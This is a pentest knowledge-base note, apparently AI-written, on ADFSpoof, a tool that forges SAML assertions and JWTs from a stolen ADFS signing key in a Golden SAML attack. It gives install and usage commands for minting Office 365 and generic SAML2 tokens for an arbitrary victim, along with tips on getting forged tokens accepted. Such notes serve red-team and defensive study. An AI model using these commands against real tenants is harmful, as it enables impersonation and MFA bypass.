# ADFSpoof

**Tags:** `#adfspoof` `#adfs` `#goldensaml` `#saml` `#jwt` `#federation`

Python tool (Mandiant) that forges SAML assertions and JWTs from the ADFS token-signing key extracted by [[Tools/AD/ADFSDump|ADFSDump]] — the forging half of a **Golden SAML** attack. Given the signing key and issuer, it mints an assertion for an arbitrary user/claims that a relying party (Microsoft 365, other SaaS) will accept as genuine, bypassing authentication and MFA. The open-source alternative to AADInternals' `New-AADIntSAMLToken`.

**Source:** https://github.com/mandiant/ADFSpoof
**Install:** `git clone https://github.com/mandiant/ADFSpoof && pip install -r requirements.txt`.

**Loading the signing key — two ways:**
- `-b <EncryptedPfx> <DKM_key>` — the **two** values [[Tools/AD/ADFSDump|ADFSDump]] prints (the EncryptedPFX blob **and** the DKM key). `-b` takes *both* args — it's not a single blob.
- `-c <signing.pfx> -p <password>` — a signing-cert **PFX directly** (e.g. one you pulled with AADInternals/mimikatz rather than ADFSDump).

**Sub-commands:** `o365` · `dropbox` · `saml2` (generic) · `dump` (decrypt → write a reusable PFX).

```bash
# Forge an Office 365 SAML assertion (note -b takes EncryptedPfx AND the DKM key)
python3 ADFSpoof.py -b <EncryptedPfx> <DKM_key> -s <sts.domain.com> o365 \
  --upn <victim@domain.com> --objectguid <b64-objectGUID>

# Same, but from a signing PFX you already own
python3 ADFSpoof.py -c signing.pfx -p <pfx_pass> -s <sts.domain.com> o365 \
  --upn <victim@domain.com> --objectguid <b64-objectGUID>

# Generic SAML2 for an arbitrary relying party
python3 ADFSpoof.py -b <EncryptedPfx> <DKM_key> -s <sts> saml2 \
  --endpoint <acs-url> --rpidentifier <rp-id> --nameid <UPN> --assertions <claims-xml>

# Just DECRYPT ADFSDump's blob into a normal PFX (reuse it with any tool later)
python3 ADFSpoof.py -b <EncryptedPfx> <DKM_key> dump --path signing.pfx
```

> [!tip] Signing algorithm defaults to `rsa-sha256` (`-a` to change). The `--objectguid` for `o365` is the target's base64 `objectGUID` — and the **ImmutableID** M365 keys off is that same GUID, so a mismatch = a token M365 silently rejects.

---

> [!note] **See also** — [[Services/Active Directory/ADFS|ADFS]] — Golden SAML forging from an extracted token-signing key (pairs with [[Tools/AD/ADFSDump|ADFSDump]]); AADInternals equivalent covered there too.

---

*Created: 2026-09-25*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
